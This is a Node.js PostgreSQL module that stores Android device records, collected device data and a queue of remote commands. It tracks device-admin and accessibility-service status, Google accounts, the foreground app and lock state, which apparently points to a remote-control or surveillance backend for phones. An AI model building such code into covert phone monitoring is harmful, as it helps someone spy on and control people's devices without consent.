'use strict';
const { Pool } = require('pg');

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false,
  max: 10,
  idleTimeoutMillis: 30000,
  connectionTimeoutMillis: 5000,
});

pool.on('error', err => console.error('[DB] Pool error:', err.message));

// ── Schema ───────────────────────────────────────────────────────────────────

const SCHEMA = `
CREATE TABLE IF NOT EXISTS devices (
    id               TEXT PRIMARY KEY,
    alias            TEXT    DEFAULT '',
    model            TEXT    DEFAULT '',
    manufacturer     TEXT    DEFAULT '',
    android_version  TEXT    DEFAULT '',
    sdk              INTEGER DEFAULT 0,
    battery_level    INTEGER DEFAULT -1,
    is_charging      BOOLEAN DEFAULT FALSE,
    admin_active     BOOLEAN DEFAULT FALSE,
    accessibility_active BOOLEAN DEFAULT FALSE,
    accounts         JSONB   DEFAULT '[]',
    ip_address       TEXT    DEFAULT '',
    current_app      TEXT    DEFAULT '',
    app_name         TEXT    DEFAULT '',
    is_locked        BOOLEAN DEFAULT FALSE,
    is_screen_on     BOOLEAN DEFAULT TRUE,
    online           BOOLEAN DEFAULT FALSE,
    last_seen        TIMESTAMPTZ DEFAULT NOW(),
    created_at       TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS device_data (
    id          BIGSERIAL PRIMARY KEY,
    device_id   TEXT NOT NULL,
    data_type   TEXT NOT NULL,
    data        JSONB NOT NULL DEFAULT '{}',
    created_at  TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS commands (
    id           TEXT PRIMARY KEY,
    device_id    TEXT NOT NULL,
    action       TEXT NOT NULL,
    params       JSONB DEFAULT '{}',
    status       TEXT DEFAULT 'pending',
    result       JSONB,
    created_at   TIMESTAMPTZ DEFAULT NOW(),
    completed_at TIMESTAMPTZ
);

CREATE INDEX IF NOT EXISTS idx_dd_device  ON device_data(device_id);
CREATE INDEX IF NOT EXISTS idx_dd_type    ON device_data(data_type);
CREATE INDEX IF NOT EXISTS idx_dd_created ON device_data(created_at DESC);
CREATE INDEX IF NOT EXISTS idx_cmd_device ON commands(device_id);
CREATE INDEX IF NOT EXISTS idx_cmd_status ON commands(status);
`;

// ── New-column migrations (idempotent) ───────────────────────────────────────

const MIGRATIONS = [
  `ALTER TABLE devices ADD COLUMN IF NOT EXISTS sdk              INTEGER DEFAULT 0`,
  `ALTER TABLE devices ADD COLUMN IF NOT EXISTS is_charging      BOOLEAN DEFAULT FALSE`,
  `ALTER TABLE devices ADD COLUMN IF NOT EXISTS admin_active     BOOLEAN DEFAULT FALSE`,
  `ALTER TABLE devices ADD COLUMN IF NOT EXISTS accessibility_active BOOLEAN DEFAULT FALSE`,
  `ALTER TABLE devices ADD COLUMN IF NOT EXISTS accounts         JSONB DEFAULT '[]'`,
  `ALTER TABLE devices ADD COLUMN IF NOT EXISTS current_app      TEXT DEFAULT ''`,
  `ALTER TABLE devices ADD COLUMN IF NOT EXISTS app_name         TEXT DEFAULT ''`,
  `ALTER TABLE devices ADD COLUMN IF NOT EXISTS is_locked        BOOLEAN DEFAULT FALSE`,
  `ALTER TABLE devices ADD COLUMN IF NOT EXISTS is_screen_on     BOOLEAN DEFAULT TRUE`,
];

async function init() {
  const client = await pool.connect();
  try {
    await client.query(SCHEMA);
    for (const m of MIGRATIONS) {
      await client.query(m).catch(() => {}); // ignore "column already exists"
    }
    console.log('[DB] Schema ready');
  } finally {
    client.release();
  }
}

// ── Queries ──────────────────────────────────────────────────────────────────

function query(sql, params = []) {
  return pool.query(sql, params);
}

// msg = DEVICE_INFO JSON from CCS
async function upsertDevice(deviceId, msg, ip) {
  return pool.query(`
    INSERT INTO devices
      (id, model, manufacturer, android_version, sdk, battery_level, is_charging,
       admin_active, accessibility_active, accounts, ip_address, online, last_seen)
    VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,TRUE,NOW())
    ON CONFLICT (id) DO UPDATE SET
      model                = EXCLUDED.model,
      manufacturer         = EXCLUDED.manufacturer,
      android_version      = EXCLUDED.android_version,
      sdk                  = EXCLUDED.sdk,
      battery_level        = EXCLUDED.battery_level,
      is_charging          = EXCLUDED.is_charging,
      admin_active         = EXCLUDED.admin_active,
      accessibility_active = EXCLUDED.accessibility_active,
      accounts             = EXCLUDED.accounts,
      ip_address           = EXCLUDED.ip_address,
      online               = TRUE,
      last_seen            = NOW()
  `, [
    deviceId,
    msg.model         || '',
    msg.manufacturer  || '',
    msg.android_version || '',
    msg.sdk           || 0,
    msg.battery_level != null ? msg.battery_level : -1,
    msg.is_charging   ?? false,
    msg.admin_active  ?? false,
    msg.accessibility_active ?? false,
    JSON.stringify(msg.accounts || msg.google_accounts || []),
    ip || '',
  ]);
}

function setDeviceOffline(deviceId) {
  return pool.query(
    'UPDATE devices SET online = FALSE, last_seen = NOW() WHERE id = $1',
    [deviceId]
  );
}

async function getDevices() {
  const { rows } = await pool.query(
    'SELECT * FROM devices ORDER BY online DESC, last_seen DESC'
  );
  return rows;
}

async function getDevice(deviceId) {
  const { rows } = await pool.query('SELECT * FROM devices WHERE id = $1', [deviceId]);
  return rows[0] || null;
}

function saveData(deviceId, dataType, data) {
  return pool.query(
    'INSERT INTO device_data (device_id, data_type, data) VALUES ($1,$2,$3)',
    [deviceId, dataType, JSON.stringify(data)]
  );
}

async function getData(deviceId, dataType, limit = 100) {
  const { rows } = await pool.query(
    'SELECT * FROM device_data WHERE device_id=$1 AND data_type=$2 ORDER BY created_at DESC LIMIT $3',
    [deviceId, dataType, limit]
  );
  return rows;
}

async function getLatestData(deviceId, dataType) {
  const { rows } = await pool.query(
    'SELECT * FROM device_data WHERE device_id=$1 AND data_type=$2 ORDER BY created_at DESC LIMIT 1',
    [deviceId, dataType]
  );
  return rows[0] || null;
}

function saveCommand(id, deviceId, action, params) {
  return pool.query(
    'INSERT INTO commands (id, device_id, action, params) VALUES ($1,$2,$3,$4)',
    [id, deviceId, action, JSON.stringify(params)]
  );
}

function updateCommand(id, status, result = null) {
  return pool.query(
    `UPDATE commands SET status=$1, result=$2,
      completed_at = CASE WHEN $1 = 'pending' THEN NULL ELSE NOW() END
     WHERE id=$3`,
    [status, result ? JSON.stringify(result) : null, id]
  );
}

async function getCommands(deviceId, limit = 50) {
  const { rows } = await pool.query(
    'SELECT * FROM commands WHERE device_id=$1 ORDER BY created_at DESC LIMIT $2',
    [deviceId, limit]
  );
  return rows;
}

function updateDeviceAlias(deviceId, alias) {
  return pool.query('UPDATE devices SET alias=$1 WHERE id=$2', [alias, deviceId]);
}

module.exports = {
  init, query,
  upsertDevice, setDeviceOffline, getDevices, getDevice,
  saveData, getData, getLatestData,
  saveCommand, updateCommand, getCommands,
  updateDeviceAlias,
};
